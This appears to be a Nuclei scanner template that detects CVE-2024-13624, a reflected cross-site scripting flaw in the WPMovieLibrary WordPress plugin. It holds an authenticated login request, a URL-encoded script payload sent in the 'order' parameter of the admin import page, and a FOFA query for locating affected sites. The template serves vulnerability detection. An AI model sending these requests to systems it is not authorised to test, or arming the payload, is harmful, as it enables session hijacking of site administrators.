flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - wpmovielibrary
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
- cookie-reuse: true
  matchers:
  - part: body
    type: word
    words:
    - '"></script><script>alert(document.domain)</script><script>'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/admin.php?page=wpmovielibrary-import&order=1%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cscript%3E
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-13624
info:
  author: ritikchaddha
  classification:
    cve-id: CVE-2024-13624
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
    cvss-score: 7.1
    cwe-id: CWE-79
    epss-percentile: 0.61949
    epss-score: 0.0043
  description: 'The WPMovieLibrary WordPress plugin through version 2.1.4.8 contains
    a reflected cross-site scripting vulnerability. The plugin does not properly sanitize
    and escape the ''order'' parameter in the import page before outputting it back,
    which could allow attackers to execute arbitrary JavaScript code in an administrator''s
    browser context.

    '
  impact: 'Authenticated attackers can execute arbitrary JavaScript in an administrator''s
    browser context via the order parameter, potentially leading to session hijacking
    or privilege escalation.

    '
  metadata:
    fofa-query: body="wp-content/plugins/wpmovielibrary/"
    max-request: 2
    product: wpmovielibrary
    verified: true
  name: WordPress WPMovieLibrary Plugin <= 2.1.4.8 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/c19b56cc-634f-420f-b6a0-9a10ad159049
  - https://nvd.nist.gov/vuln/detail/CVE-2024-13624
  remediation: 'Update WPMovieLibrary plugin to a version newer than 2.1.4.8.

    '
  severity: high
  tags: cve,cve2024,wp,wordpress,wp-plugin,xss,wpmovielibrary,authenticated,vuln
